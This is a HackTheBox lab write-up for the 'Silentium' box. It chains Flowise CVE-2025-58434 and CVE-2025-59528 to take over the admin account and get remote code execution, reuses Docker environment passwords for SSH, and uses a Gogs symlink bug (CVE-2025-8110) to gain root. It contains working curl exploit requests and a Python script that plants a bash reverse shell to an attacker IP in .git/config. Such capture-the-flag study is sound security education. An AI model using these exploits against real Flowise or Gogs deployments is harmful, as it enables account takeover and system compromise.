---
title: "HTB Silentium — Flowise RCE, Docker Escape & Gogs Symlink to Root"
date: 2026-06-23
categories: [HackTheBox, Linux]
tags: [htb, linux, flowise, docker, gogs, cve-2025-58434, cve-2025-59528, cve-2025-8110, password-reset, rce, symlink, ssh-port-forwarding]
classes: wide
header:
  image: /assets/images/SILENTIUM/silent.png
  teaser: /assets/images/SILENTIUM/silent.png
---

<style>
p { text-align: justify; }
</style>

# HTB Silentium

**Difficulty:** Easy  
**OS:** Linux (Ubuntu)  
**Platform:** HackTheBox  
**Category:** Web / Docker / Git  
**Status:** Active

---

## Overview

Silentium is a Linux box that chains three CVEs across two different applications to go from zero credentials to root. The corporate landing page is a distraction . The real attack surface is a staging subdomain running Flowise, an open-source AI agent builder. A password reset token leak gives you admin access. A Node.js code injection vulnerability gives you a shell inside Docker. Environment variable reuse gets you onto the host. And a Gogs symlink vulnerability lets you inject commands that execute as root.

Three CVEs, one box. Let's go!-_-!

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC -T4 -p- --min-rate 10000 10.129.245.103
```

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH
80/tcp open  http     Nginx
```

Minimal attack surface; SSH and a web server. Domain added:

```bash
echo "10.129.245.103 silentium.htb" >> /etc/hosts
```

---

### The Corporate Site

The main site is a static corporate page for "Silentium" --> an institutional finance firm. Directory brute forcing was completely useless because the server returns 200 for everything (SPA routing):

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  --exclude-length 8753
```

Everything returned the same file size. Nothing useful.

But the leadership section of the page had names: **Marcus Thorne**, **Ben**, **Elena Rossi**. Filed for later.

---

### Finding the Staging Subdomain

The main site was a dead end. A comment in the HTML hinted at a staging environment. Fuzzed for vhosts:

```bash
curl http://10.129.245.103 -H "Host: staging.silentium.htb" -I
```

```
HTTP/1.1 200 OK
```

It exists.

```bash
echo "10.129.245.103 staging.silentium.htb" >> /etc/hosts
curl http://staging.silentium.htb/
```

**Flowise** --> an open-source AI agent builder platform.
![FLowise](/assets/images/SILENTIUM/sil_mcp.png)

```bash
curl http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

Flowise 3.0.5. Two public CVEs chain together on this version.

---

## Initial Access —> CVE-2025-58434 (Password Reset Token Leak)

### What This CVE Does

The `/api/v1/account/forgot-password` endpoint returns the password reset token directly in the api response (no authentication required). If you know a valid email, you can reset any account without ever touching the user's inbox.

### Finding the Email

From the leadership section: "Ben — Head of Financial Systems." Guessed `ben@silentium.htb`:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "W9r5V1ARo7SMpOy6SdfscWZmJg1zVGPXYejuWUu3i0eORQTBD1uDsopNDpXfZmJW",
    "status": "active"
  }
}
```

Ben is also the admin account. Token in hand.

### Resetting the Password
![Forgot](/assets/images/SILENTIUM/sil_forgotp.png)
```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "W9r5V1ARo7SMpOy6SdfscWZmJg1zVGPXYejuWUu3i0eORQTBD1uDsopNDpXfZmJW",
      "password": "LYAGAMI2026!"
    }
  }'
```

### Logging In

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"LYAGAMI2026!"}' \
  -c cookies.txt
```

JWT token, refresh token, session cookie all back. Flowise admin access confirmed.

---

## RCE — CVE-2025-59528 (CustomMCP Node Injection)

### What This CVE Does

The CustomMCP node in Flowise passes user input directly into a Node.js `Function()` constructor. Authenticated users can execute arbitrary OS commands. The RCE is triggered through the API endpoint `/api/v1/node-load-method/customMCP` not through the chat UI (or maybe it does and i didn't get it right :‑) ).

### Mistake I Made

I spent time trying to build a chatflow in the Flowise web UI to trigger the RCE; connecting nodes, configuring triggers. None of it worked. The UI is designed for building legitimate AI workflows, not for one-shot code execution. The web UI is just a frontend that calls the same API endpoints. The exploit is API-only.

Authorization header issues also burned time. The Bearer token from the login response kept returning "Unauthorized Access" when hitting the CustomMCP endpoint directly. Different formats, different header combinations. None worked cleanly. The chain exploit script handles auth internally by grabbing the API key from `/apikey` first, which is the correct flow.

### The Working Exploit

```bash
git clone https://github.com/AzureADTrent/CVE-2025-58434-59528.git
cd CVE-2025-58434-59528
pip install requests --break-system-packages
```

Start listener:

```bash
nc -lvnp 443
```

Run the chain:
![SCRIPT](/assets/images/SILENTIUM/sil_rce.png)
```bash
python3 flowise_chain.py \
  -t http://staging.silentium.htb \
  -e ben@silentium.htb \
  --lhost 10.10.16.32 \
  --lport 443
```

The script requests the reset token, resets the password, grabs the API key from the web UI, and fires the CustomMCP payload.
![API](/assets/images/SILENTIUM/sil_api.png)
```
/ # whoami
root
/ # hostname
c78c3cceb7ba
```

Shell as root inside a Docker container.

---

## Escaping Docker — Environment Variable Leak

```bash
env | grep -i pass
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```
![SMTP](/assets/images/SILENTIUM/sil_smtp.png)
Two passwords in env. The SMTP password looked like something someone would reuse.

---

## User Flag — SSH Access

```bash
ssh ben@10.129.245.103
# Password: r04D!!_R4ge
```

Password reuse confirmed. On the host.

```bash
cat ~/user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## Privilege Escalation — Gogs CVE-2025-8110

### Enumeration

```bash
ss -tunlp
```

```
127.0.0.1:3000  — Gogs
127.0.0.1:3001  — Gogs
```

Gogs is a lightweight self-hosted Git service, running locally only. Port forward to reach it:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
```

Now accessible at `http://127.0.0.1:3001`.
![Gogs](/assets/images/SILENTIUM/sil_gogs.png)
### Registering on Gogs

```
http://127.0.0.1:3001/user/sign_up
Username: Kira
Password: Password123
```
Yes deathnote again(^_^)/
---

### CVE-2025-8110 —> What It Does

Gogs doesn't properly validate symlinks when handling repository file operations. The attack chain:

```
Create a repo
→ Push a symlink pointing to .git/config
→ Use the API to PUT content through the symlink
→ Gogs follows the symlink and writes to the real .git/config
→ Inject sshCommand into the config
→ When Gogs runs any git operation, the injected command executes as root
```

### Mistake I Made

The public PoC script (`CVE-2025-8110.py`) failed immediately on auto-registration:

```
Registration failed: 200
```

It was trying to register a hardcoded user `zAbuQasem` but something (CAPTCHA or similar) was blocking it. I already had the Kira account, so I skipped the script entirely and did the steps manually.

### Manual Exploitation

Create an API token at `http://127.0.0.1:3001/user/settings/applications`.
![TOKEN](/assets/images/SILENTIUM/sil_token.png)
Clone the repo, push the symlink:

```bash
cd /tmp
git clone http://Kira:Password123@127.0.0.1:3001/Kira/law.git
cd law
ln -s .git/config evil
git add evil
git commit -m "symlink"
git push origin master
```
![Gogs](/assets/images/SILENTIUM/sil_law.png)
Write the exploit script:

```python
import requests, base64

TOKEN = "ba946307f1b34be24797c4476c6977a93fbe7151"
BASE_URL = "http://127.0.0.1:3001"
USERNAME = "Kira"
REPO = "law"
LHOST = "10.10.16.32"
LPORT = "2345"

command = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' #"

git_config = f"""[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        ignorecase = true
        precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
        url = git@localhost:gogs/{REPO}.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
"""

url = f"{BASE_URL}/api/v1/repos/{USERNAME}/{REPO}/contents/evil"
encoded = base64.b64encode(git_config.encode()).decode()

session = requests.Session()
resp = session.put(url,
    json={"content": encoded, "message": "exploit", "branch": "master"},
    headers={"Authorization": f"token {TOKEN}"}
)
print(f"Status: {resp.status_code}")
```

Start listener and fire:

```bash
nc -lvnp 2345
python3 exploit_manual.py
```

---

## Root Flag

```
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
[REDACTED]
```
![ROOT](/assets/images/SILENTIUM/sil_root.png)
**Root flag captured. Box pwned.** ✅

---

## Full Attack Chain

```
Vhost fuzzing → staging.silentium.htb (Flowise 3.0.5)
  │
  CVE-2025-58434: forgot-password leaks tempToken
  └─ Reset ben@silentium.htb password → Flowise admin
     │
     CVE-2025-59528: CustomMCP API → Node.js RCE
     └─ Shell in Docker container (root)
        └─ env leak: SMTP_PASSWORD=r04D!!_R4ge
           │
           SSH as ben:r04D!!_R4ge
           └─ USER FLAG ✅
              │
              ss -tunlp → Gogs on 127.0.0.1:3001
              └─ SSH port forward → register Kira account
                 └─ Create repo → push symlink → .git/config
                    └─ CVE-2025-8110: API PUT overwrites config
                       └─ Inject sshCommand → git triggers execution
                          └─ ROOT SHELL → ROOT FLAG ✅
```

---

## Credentials Found

| Username | Password | Source | Purpose |
|---|---|---|---|
| ben@silentium.htb | reset by us | CVE-2025-58434 | Flowise admin |
| ben@silentium.htb | F1l3_d0ck3r | Docker env | Flowise original |
| ben | r04D!!_R4ge | Docker env (SMTP) | SSH access |
| Kira | Password123 | Created by us | Gogs account |


## What Did We Learn?

**1. Always fuzz for virtual hosts**  
The main site was a complete dead end. The Host header revealed an entire second application that nmap couldn't see. Vhost fuzzing should be in every web recon checklist — not just directory brute forcing.

**2. Password reset endpoints are goldmines**  
CVE-2025-58434 leaks the reset token directly in the API response. No email access needed. Always test forgot-password flows — they're frequently implemented insecurely, especially in smaller open-source platforms that haven't had a proper security audit.

**3. The web UI is not the exploit surface**  
I wasted time in the Flowise UI trying to trigger the RCE through a chatflow. The vulnerability is in the API endpoint. When a CVE reference points to a specific endpoint, go straight to the API — don't assume the UI exposes the same functionality in an exploitable way.

**4. Docker environment variables leak secrets**  
`env` and `/proc/1/environ` inside containers are full of passwords set by whoever deployed the stack. SMTP credentials, database passwords, API keys — all sitting there in plaintext. And those credentials almost always get reused somewhere on the host.

**5. Localhost doesn't mean safe**  
Gogs was bound to 127.0.0.1, inaccessible from outside. SSH port forwarding made it fully accessible in under ten seconds. Internal-only services get far less security attention and tend to run vulnerable versions — they're often the most valuable targets once you're on a host.

**6. Public PoCs need tweaking — always**  
Both the Flowise chain script and the Gogs exploit required manual intervention. The Gogs PoC failed completely on auto-registration. Understanding what the script is actually doing matters more than just running it. Read the code, break it into steps, do it manually when it fails.

**7. Symlink attacks are still being shipped in production software in 2025**  
Gogs followed a symlink and wrote attacker-controlled content to `.git/config`. Proper symlink validation in file operations is not a new concept — and yet here we are.

---

<img src="https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dTIxaGU1ejk5eXR4ZTJ6czY5NnUwNmxmaWU2cjE1cTMwNzJrMG1mbiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Kjqyc7spzgOK4/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">

*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
